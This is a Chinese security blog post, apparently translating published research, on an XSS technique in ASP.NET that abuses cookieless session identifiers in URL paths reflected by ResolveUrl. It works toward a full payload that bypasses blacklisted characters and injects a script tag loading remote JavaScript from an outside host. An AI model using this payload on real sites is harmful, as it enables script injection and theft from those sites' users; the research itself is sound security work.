@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"m09ic.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="*(本文首发于先知社区,链接:https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7453) 原文链接: All is XSS that comes to the .NET 原作者: Paweł Hałdrzyński 在portswigger发布的2019年十大web攻击技术中发现了这篇文章，仔细研究了一番，觉得挺有意思，故尝试翻译。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通杀.NET的XSS!(原文翻译以及复现)">
+<meta property="og:url" content="https://m09ic.top/posts/35797/index.html">
+<meta property="og:site_name" content="M09ic&#39;s Blog">
+<meta property="og:description" content="*(本文首发于先知社区,链接:https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7453) 原文链接: All is XSS that comes to the .NET 原作者: Paweł Hałdrzyński 在portswigger发布的2019年十大web攻击技术中发现了这篇文章，仔细研究了一番，觉得挺有意思，故尝试翻译。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://m09ic.top/posts/35797/asp_net_3.png">
+<meta property="og:image" content="https://m09ic.top/posts/35797/image-20200323020903891.png">
+<meta property="og:image" content="https://m09ic.top/posts/35797/image-20200323021054821.png">
+<meta property="og:image" content="https://m09ic.top/posts/35797/image-20200323021546570.png">
+<meta property="og:image" content="https://m09ic.top/posts/35797/image-20200323022126909.png">
+<meta property="og:image" content="https://m09ic.top/posts/35797/image-20200323022227594.png">
+<meta property="og:image" content="https://m09ic.top/posts/35797/image-20200323024002741.png">
+<meta property="article:published_time" content="2020-03-22T19:21:26.000Z">
+<meta property="article:modified_time" content="2021-01-04T14:51:09.188Z">
+<meta property="article:author" content="M09ic">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://m09ic.top/posts/35797/asp_net_3.png">
+
+<link rel="canonical" href="https://m09ic.top/posts/35797/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>通杀.NET的XSS!(原文翻译以及复现) | M09ic's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-140303637-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-140303637-1');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?04d80448a6c7bfee29f2e7379ff56865";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="M09ic's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">M09ic's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">独自行走于莽荒之地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/35797/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          通杀.NET的XSS!(原文翻译以及复现)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-23 03:21:26" itemprop="dateCreated datePublished" datetime="2020-03-23T03:21:26+08:00">2020-03-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:51:09" itemprop="dateModified" datetime="2021-01-04T22:51:09+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/35797/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/35797/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>*(本文首发于先知社区,链接:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7453">https://xz.aliyun.com/t/7453</a>)</p>
+<p>原文链接: <a target="_blank" rel="noopener" href="https://blog.isec.pl/all-is-xss-that-comes-to-the-net/">All is XSS that comes to the .NET</a></p>
+<p>原作者: Paweł Hałdrzyński</p>
+<p>在<a target="_blank" rel="noopener" href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2019">portswigger发布的2019年十大web攻击技术</a>中发现了这篇文章，仔细研究了一番，觉得挺有意思，故尝试翻译。</p>
+<a id="more"></a>
+
+<p>portswigger对这个技术的评论是:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://twitter.com/phaldrzynski">Paweł Hałdrzyński</a> takes a <a target="_blank" rel="noopener" href="https://blog.isec.pl/all-is-xss-that-comes-to-the-net/">little-known legacy feature</a> of the .NET framework and shows how it can be used to add arbitrary content to URL paths on arbitrary endpoints， causing us some mild panic when we realised even our own website supported it.</p>
+<p>Reminiscent of <a target="_blank" rel="noopener" href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Relative Path Overwrite</a> attacks， this is a piece of arcana that can sometimes kick off an exploit chain. In the post it’s used for XSS， but we strongly suspect alternative abuses will emerge in future.</p>
+</blockquote>
+<p>第一次翻译文章，如果建议或者有错误请在评论区指出，我会看到一定会回复或修正的。</p>
+<p>(部分语句我按照我自己的理解进行重构，以防止翻译体降低阅读体验，如果有疑问，可以对照原文阅读)</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>在很多框架中,往项目中简便地添加我们自己的资源(如.css和.js)是一个重要的特性.手动插入带有一堆<code>../</code>资源属实恶心.如果使用绝对路径，则会在更改文件或目录结构时仍需要再次花费时间修改资源的路径，而且将应用程序部署到子目录或者更改部署位置的时候，也会使绝对路径失效.幸运的是，对于开发人员，在部署ASP.NET时可以通过与应用程序根目录相对的URL来解决上述问题.更幸运的是，对于攻击人员，这将导致了一些新的方法攻击方法。</p>
+<h3 id="How-does-it-work"><a href="#How-does-it-work" class="headerlink" title="How does it work?"></a>How does it work?</h3><p>让我们看一下<code>Control.ResolveUrl</code>方法，该方法可以解析相对于应用程序根目录的路径。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;C#&quot; %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;Script.js&quot;) %&gt;&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    .NET version: &lt;%&#x3D;Environment.Version%&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>这段程序会在将<code>~/Script.js</code>这个路径转化为特定路径.如果开发者将Script.js部署在应用的根目录，并在<code>A/B/C/default.aspx</code>文件中用了上面这段代码，当我们访问<code>http://localhost/A/B/C/default.aspx</code>时，会看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;Script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>这功能看起来很方便，ASP.NET将~(波浪号)解析为应用程序的根目录，即Script.js的确切位置。就算我们把项目移动到其他位置部署，路径也会跟着更改，使得Script.js依旧可以被访问。</p>
+<p>这个行为似乎很安全，不是吗?那如果我告诉你可以任意修改Script.js的URL地址呢?</p>
+<h3 id="回到以前"><a href="#回到以前" class="headerlink" title="回到以前"></a>回到以前</h3><p>让我们回到那个连浏览器都还不支持Cookie头的灰暗年代，没有Cookie管理用户session似乎是一个问题.然而ASP.NET直接在把session保存在URL中来解决这个问题，正如 <em><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10)">了解ASP.NETCookie功能如何工作</a></em> 中所述：</p>
+<blockquote>
+<p>在ASP.NET的早起版本(V1.0和V1.1)中， 只有Session State使用了Cookieless这个特性。</p>
+<p>(…)</p>
+<p>在V2.0版本，匿名身份认证和表单认证也使用了这个功能。</p>
+</blockquote>
+<p>随着时间流逝，现在普遍将session存储在Cookie头中.但是，开发人员依旧得处理不支持Cookie的浏览器。ASP.NET 介绍了<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.sessionstatesection.cookieless?view=netframework-4.8"><em>SessionStateSection.Cookieless property</em></a> 如何定义和保存session(使用Cookie或在URL中)。</p>
+<p>我们不需要深入了解Cookieless session是怎么运作的，我们只需要知道session ID是如何传递以及如何在URI中表示。</p>
+<p>根据<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/ms178581(v=vs.140)">MSDN</a>：</p>
+<blockquote>
+<p>ASP.NET自动将唯一的session ID插入页面的URL中来维护Cookieless会话状态。例如，ASP.NET中通过以下URL保存唯一的session ID lit3py55t21z5v55vlm25s55：<br><code>http://www.example.com/(S(lit3py55t21z5v55vlm25s55))/orderform.aspx</code></p>
+</blockquote>
+<p>URL还可以有一些其他的Cookieless身份标识符(cookieless identifiers):</p>
+<ul>
+<li>(A(?)) - Anonymous ID</li>
+<li>(S(?)) - Session ID</li>
+<li>(F(?)) - Form Authentication Ticket</li>
+</ul>
+<p>对于现代浏览器，<code>SessionStateSection.Cookieless</code>属性的默认值<code>AutoDetect</code>等于将会话ID存储在Cookie头中（而不是将其保存在URL中）。但是，即使强制ASP.NET禁用Cookieless功能(在web.config中将<code>cookieless</code>参数设置为<code>UseCookies</code>也不会导致带<code>cookieless identifiers</code>报错。</p>
+<p>这意义着两种方式访问<code>http://localhost/(A(ABCD))/default.aspx</code>结果是一样的。</p>
+<p>而且，在访问<code>http://localhost/default.aspx</code>的时候，<code>ResolveUrl</code>会将这些标识符解析到URL中。</p>
+<p>让我们快速浏览一下<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/system.web.ui.control.resolveurl(v=vs.110).aspx">文档</a>：</p>
+<blockquote>
+<p>如果你的应用程序依赖于Cookieless session或者从需要Cookieless session的浏览器接收到请求，在路径中使用波浪号（〜）可能会创建一个新session并可能导致丢失session数据</p>
+</blockquote>
+<p>现在，让我们回到最早的<code>ResolveUrl</code>代码段，它位于<code>A/B/C/default.aspx</code>，如图:</p>
+<p><img src="asp_net_3.png" alt="img"></p>
+<p>当我们打开*<code>http://localhost/(A(ABCD))/A/B/C/default.aspx</code> ，  <code>(A(ABCD))</code>也被加到Script.js路径中了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;(A(ABCD))&#x2F;Script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>把<code>A(ABCD)</code>放到不同的位置效果也一样，例如:访问<code>http://localhost/A/B/C/(A(ABCD))/default.aspx</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;(A(ABCD))&#x2F;Script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>正像我刚才说的那样，现在可以看到我们成功控制了Script.js的URI路径。</p>
+<p>这个控制可以让我们开始XSS了!例如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;A&#x2F;B&#x2F;C&#x2F;(A(%22onerror&#x3D;%22alert&#96;1&#96;%22))&#x2F;default.aspx</span><br></pre></td></tr></table></figure>
+<p>这只是一个简单的alert，(译者注:虽然大部分情况用alert就可以证明存在xss了，但并不一定能执行任意js代码).所以真正的乐趣开始了，因为地方并不是允许所有字符的。</p>
+<p>Fuzz一下，从0x00-0xF7，找出处哪些字符无法使用。</p>
+<p>从0x00到0x1F直接都会导致服务器返回400，这些是不可打印的ASCII字符，因此我们忽略它们.进一步测试，其他禁止使用的字符(返回400或404)是:</p>
+<table>
+<thead>
+<tr>
+<th>%</th>
+<th>0x25</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;</td>
+<td>0x26</td>
+</tr>
+<tr>
+<td>)</td>
+<td>0x29</td>
+</tr>
+<tr>
+<td>*</td>
+<td>0x2a</td>
+</tr>
+<tr>
+<td>+</td>
+<td>0x2b</td>
+</tr>
+<tr>
+<td>/</td>
+<td>0x2f</td>
+</tr>
+<tr>
+<td>:</td>
+<td>0x3a</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>0x3c</td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td>0x3e</td>
+</tr>
+<tr>
+<td>?</td>
+<td>0x3f</td>
+</tr>
+<tr>
+<td>\</td>
+<td>0x5c</td>
+</tr>
+</tbody></table>
+<p>黑名单中有三个字符对我们特别有用:</p>
+<ul>
+<li>右括号–我们需要它来调用JavaScript中的函数</li>
+<li>加号–我们经常用来连接字符串</li>
+<li>斜线–我们不仅要运行一些JS，还需要将结果发送到某个地方，例如VPS；没有斜杠我们就无法进入VPS</li>
+</ul>
+<p>现在，让我们思考一下如何绕过它们。</p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS!"></a>XSS!</h3><p>在JavaScript的ES6中提供了一种新特性去调用模板字符串—-反引号.用反引号代替单引号或双引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var text &#x3D; &#39;Hello&#39;</span><br><span class="line">var text &#x3D; &#96;Hello&#96;</span><br></pre></td></tr></table></figure>
+<p>反引号有一个重要特性，它可以用来执行JavaScript表达式，<code>$&#123;&#125;</code>的变量会被插入到字符串中.例如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var text &#x3D; &#96;Hello from $&#123;document.domain&#125;&#96;</span><br><span class="line">console.log(text)</span><br><span class="line">&gt;&gt;&gt; Hello from blog.isec.pl</span><br></pre></td></tr></table></figure>
+<p>这种方法可以用来代替<code>+</code>拼接字符串，例如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(&#96;$&#123;&#39;a&#39;&#125;$&#123;&#39;b&#39;&#125;$&#123;&#39;c&#39;&#125;&#96;)</span><br><span class="line">&gt;&gt;&gt; abc</span><br></pre></td></tr></table></figure>
+<p>反引号还使我们摆脱的括号.我保证大伙肯定用过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert&#96;1&#96;</span><br></pre></td></tr></table></figure>
+<p>让我们用这个技巧来创建一个<code>script</code>标签:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">js&#x3D;document.createElement(&#39;script&#39;)</span><br><span class="line">js&#x3D;document.createElement&#96;script&#96;</span><br></pre></td></tr></table></figure>
+<p>创建script元素后，还需要设置src使其指向外部的XSS payload。</p>
+<p>由于太多字符列入了黑名单，所以我们用创造了一种通用的方法动态加载我们的外部主机 XSS payload。</p>
+<p>另外，ASP.NET的<code>cookieless session ID</code>有长度限制，得从其他地方加载JavaScript脚本来绕过。</p>
+<p>在VPS上挂一个写了<code>alert(document.domain)</code>的脚本，假设路径为<code>http://eval/xss.js</code></p>
+<p>当script标签创建的时候，我们需要他的<code>src</code>指向外部的XSS payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js.src&#x3D;&#39;&#x2F;&#x2F;eval&#x2F;xss.js&#39;</span><br></pre></td></tr></table></figure>
+<p>斜杠被禁用了，可以通过<code>String.fromCharCode</code>绕过.用<code>String.fromCharCode`47` </code>绕过<code>\</code>，并且将其拼接起来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js.src&#x3D;&#96;$&#123;String.fromCharCode&#96;47&#96;&#125;$&#123;String.fromCharCode&#96;47&#96;&#125;eval$&#123;String.fromCharCode&#96;47&#96;&#125;XSS.JS&#96;</span><br></pre></td></tr></table></figure>
+<p>现在我们还需要一个地方放script标签，比如<code>head</code>就不错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">headEl&#x3D;document.getElementsByTagName&#96;head&#96;[0];</span><br></pre></td></tr></table></figure>
+<p>然后我们需要调用<code>headEl.appendChild(js)</code> ，然而，事实却出乎意料:</p>
+<p>让我们回到<code>alert`1` </code>的例子.尽管它可以像字符串一样工作，但是当我们传入js表达式的时候，他会产生非常意外的结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert&#96;$&#123;1&#125;&#96;</span><br></pre></td></tr></table></figure>
+<p>弹出了一个逗号，而不是预期中的1，事实证明，<code>alert(`$&#123;1&#125;`) </code>与<code>alert`$&#123;1&#125;` </code>不一样。</p>
+<p>后一种语法叫带标签的模板字符串.<code>function`params` </code>不会将params传入到函数的参数中，它仅仅使用函数修改模板字符串的参数。</p>
+<p>(译者注，很难用语言解释这个概念，可以看下官方文档<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2</a>)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function whatsGoingOn()</span><br><span class="line">&#123;</span><br><span class="line">	console.log(arguments);</span><br><span class="line">&#125;</span><br><span class="line">whatsGoingOn&#96;$&#123;1&#125;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [ [&quot;&quot;， &quot;&quot;]， 1 ]</span><br></pre></td></tr></table></figure>
+<p>结果中，数组的第一个参数是围绕js表达式的字符串，确认一下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatsGoingOn&#96;LEFT$&#123;5-1&#125;RIGHT&#96;</span><br><span class="line">&gt;&gt;&gt; [ [&quot;LEFT&quot;， &quot;RIGHT&quot;]， 4 ]</span><br></pre></td></tr></table></figure>
+<p>这对我们来说是个好消息，JavaScript提供了一个执行代码的方法.如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new Function([&quot;whatever&quot;，&quot;whatever&quot;]，&quot;alert(1)&quot;)()</span><br><span class="line">\\等效于</span><br><span class="line">var test &#x3D; &quot;alert(1)&quot;;</span><br><span class="line">new Function&#96;whatever$&#123;test&#125;whatever&#96;</span><br></pre></td></tr></table></figure>
+<p>现在我们要做的只是调用与<code>headEl.appendChild(js)</code>等效的方法.但是我们仍然不能使用括号。</p>
+<p>我们为什么要关心呢?让我们把<code>headEl.appendChild(js)</code>放在URI的hash中，比如<code>http://localhost/A/B/C/default.aspx#headEl.appendChild(js)</code>，然后调用<code>new Function</code>上的<code>document.location.hash</code>。</p>
+<p>还需要摆脱<code>#</code>号，可以这样<code>document.location.hash.substr`1` </code>，最终payload!!!</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">js &#x3D; document.createElement&#96;script&#96;;</span><br><span class="line">js.src&#x3D;&#96;$&#123;String.fromCharCode&#96;47&#96;&#125;$&#123;String.fromCharCode&#96;47&#96;&#125;blog.isec.pl$&#123;String.fromCharCode&#96;47&#96;&#125;XSS.JS&#96;;</span><br><span class="line">headEl&#x3D;document.getElementsByTagName&#96;head&#96;[0];</span><br><span class="line">new Function&#96;X$&#123;document.location.hash.substr&#96;1&#96;&#125;X&#96;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;A&#x2F;B&#x2F;C&#x2F;(A(%22onerror&#x3D;%22js&#x3D;document.createElement&#96;script&#96;;js.src&#x3D;&#96;$&#123;String.fromCharCode&#96;47&#96;&#125;$&#123;String.fromCharCode&#96;47&#96;&#125;eval$&#123;String.fromCharCode&#96;47&#96;&#125;XSS.JS&#96;;headEl&#x3D;document.getElementsByTagName&#96;head&#96;[0];new%20Function&#96;X$&#123;document.location.hash.substr&#96;1&#96;&#125;X&#96;%22))&#x2F;default.aspx#headEl.appendChild(js)</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
+<p>已在所有主流浏览器(Firefox，Chrome，Edge)上测试这个漏洞。</p>
+<table>
+<thead>
+<tr>
+<th>ASP.NET version</th>
+<th>&lt;%=Environment.Version%&gt; == 4.0.30319.42000</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Firefox</td>
+<td>69.0.1 (64-bit) (the newest version)</td>
+</tr>
+<tr>
+<td>Microsoft Edge</td>
+<td>44.17763.1.0 (the newest version)</td>
+</tr>
+<tr>
+<td>Chrome</td>
+<td>77.0.3865.90 (Official Build) (64-bit) [XSS Auditor needs to be disabled]</td>
+</tr>
+</tbody></table>
+<p>(译者注，似乎是个通杀全版本ASP.NET version的洞，复现在文章最后)</p>
+<h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><p><code>scirpt</code>标签并非唯一会使用<code>ResolveUrl</code>的HTML标签，<code>link</code>，<code>a</code>，<code>img</code>等其他标签同样会使用.下面的代码包含了能导致XSS的HTML标签(对于<code>a href</code>，请使用<code>onmouseover</code>或<code>onclick</code>代替<code>onerror</code>，否则无法使用)。</p>
